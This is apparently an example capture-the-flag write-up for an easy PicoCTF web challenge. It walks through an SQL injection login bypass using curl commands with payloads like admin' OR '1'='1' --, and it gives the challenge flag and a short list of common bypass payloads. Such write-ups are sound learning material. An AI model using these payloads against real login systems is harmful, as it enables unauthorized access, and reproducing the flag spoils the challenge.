# Example: SQL Injection Basic

**Category**: Web  
**Difficulty**: Easy  
**Points**: 100  
**Platform**: PicoCTF  
**Date Solved**: 2024-01-15

## Challenge Description

Can you log into this web application? Try to see if you can login!

Additional details: The web application appears to be a simple login form.

## Files/URLs Provided

- http://mercury.picoctf.net:39515/

## Initial Analysis

### First Impressions
- Simple login form with username and password fields
- Likely vulnerable to SQL injection based on challenge name
- No registration functionality visible

### Tools Used for Initial Reconnaissance
- Web browser for initial exploration
- Burp Suite for request interception
- curl for testing payloads

## Solution Process

### Step 1: Analyze the Login Form
Examined the login form and noticed it's a basic HTML form submitting to `/login` endpoint.

```html
<form method="POST" action="/login">
    <input type="text" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" value="Login">
</form>
```

**Findings**: Standard login form, no client-side validation visible.

### Step 2: Test for SQL Injection
Tried basic SQL injection payloads in the username field:

```bash
# Test payload 1
curl -X POST http://mercury.picoctf.net:39515/login \
  -d "username=admin'&password=anything"
```

Received an SQL error, confirming the vulnerability.

### Step 3: Exploit the Vulnerability
Used a classic SQL injection bypass payload:

```bash
# Successful payload
curl -X POST http://mercury.picoctf.net:39515/login \
  -d "username=admin' OR '1'='1' --&password=anything"
```

**Findings**: Successfully bypassed authentication and gained access.

### Final Step: Getting the flag
After successful login, the application displayed the flag on the dashboard page.

## Flag
```
picoCTF{50meth1ng_50meth1ng_5ql_1nj3ct10n}
```

## Key Learning Points

- Basic SQL injection can bypass authentication by manipulating the WHERE clause
- Comment syntax (--) is crucial to ignore the rest of the SQL query
- Always test for SQL injection in any input field that interacts with a database
- Error messages can provide valuable information about the database structure

## Tools and Techniques Used

- **Tools**: curl, Burp Suite, web browser
- **Techniques**: SQL injection, boolean-based bypass, comment injection
- **Resources**: OWASP SQL Injection Prevention Cheat Sheet

## Notes for Future Reference

- For authentication bypass, focus on making the WHERE clause always true
- Common payloads: `admin' OR '1'='1' --`, `admin' OR 1=1 --`
- Remember to URL-encode special characters when necessary
- Test both username and password fields for injection points

## Time Spent
- **Total time**: 25 minutes
- **Breakdown**: 
  - Initial analysis: 5 minutes
  - Testing and exploitation: 15 minutes
  - Documentation: 5 minutes

---
*Challenge completed as part of CTF learning journey - Example Writeup*